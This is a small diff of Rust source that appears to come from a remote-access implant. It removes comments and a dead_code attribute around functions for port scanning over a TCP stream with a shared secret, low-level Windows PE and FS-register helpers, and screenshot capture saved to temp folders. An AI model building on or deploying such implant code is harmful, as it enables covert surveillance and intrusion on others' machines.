@@ -300,7 +300,6 @@ pub fn handle_portscan(stream: &mut TcpStream, command: &str, shared_secret: &[u
         .expect("Error writing to stream");
 }
 
-// windows utils
 #[cfg(windows)]
 const IMAGE_ORDINAL_FLAG64: u64 = 0x8000000000000000;
 #[cfg(windows)]
@@ -379,7 +378,6 @@ unsafe fn __readfsdword(offset: u32) -> u32 {
     output
 }
 
-#[allow(dead_code)]
 pub fn handle_screenshot() {
     fn normalized(filename: &str) -> String {
         filename
@@ -394,7 +392,6 @@ pub fn handle_screenshot() {
 
     let image = monitor.capture_image().unwrap();
 
-    // save in /tmp on linux and C:\Window\Temp on windows
     #[cfg(windows)]
     image.save(format!("C:\\Windows\\Temp\\screenshot-{}.png", normalized(monitor.name()))).unwrap();
     #[cfg(target_os = "linux")]
